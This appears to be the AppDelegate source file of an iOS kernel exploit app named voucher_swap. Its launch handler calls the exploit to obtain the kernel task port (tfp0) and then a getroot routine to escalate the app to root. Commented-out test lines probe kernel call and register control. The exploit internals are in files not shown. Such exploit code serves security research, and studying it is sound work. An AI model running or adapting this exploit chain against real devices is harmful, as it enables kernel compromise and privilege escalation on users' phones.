//
//  AppDelegate.m
//  voucher_swap
//
//  Created by Brandon Azad on 12/7/18.
//  Copyright © 2018 Brandon Azad. All rights reserved.
//

#import "AppDelegate.h"
#include "postsploit.h"
#include <unistd.h>
#import "voucher_swap.h"
#import "kernel_call.h"
#import "log.h"
#import "offsets.h"

@interface AppDelegate ()

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    sleep(30);
    offsets_init();
	mach_port_t tfp0 = voucher_swap();
    if (!MACH_PORT_VALID(tfp0)) {
        printf("failed to get tfp0!\n");
        exit(1);
    }
    printf("we got tfp0 at: 0x%x\n",tfp0);
//	bool ok = kernel_call_init();
	//if (!ok) {
	//	exit(1);
	//}
	//INFO("about to panic: check the panic log to observe PC+register control");
	sleep(1);
    if (getroot(tfp0) != 0) {
        printf("failed to get root our UID is: %i /n", getuid());
        exit(1);
    }
    INFO("WE ARE RUNNING AS ROOT! UID: %i", getuid());
    
    
	//kernel_call_7(0xfffffff041414141, 7,
			//0x4040404040404040,
			//0x4141414141414141,
			//0x4242424242424242,
			//0x4343434343434343,
			//0x4444444444444444,
			//0x4545454545454545,
		//	0x4646464646464646);
	//kernel_call_deinit();
	return YES;
}


- (void)applicationWillResignActive:(UIApplication *)application {
	// Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
	// Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
}


- (void)applicationDidEnterBackground:(UIApplication *)application {
	// Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
	// If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}


- (void)applicationWillEnterForeground:(UIApplication *)application {
	// Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
}


- (void)applicationDidBecomeActive:(UIApplication *)application {
	// Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}


- (void)applicationWillTerminate:(UIApplication *)application {
	// Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}


@end
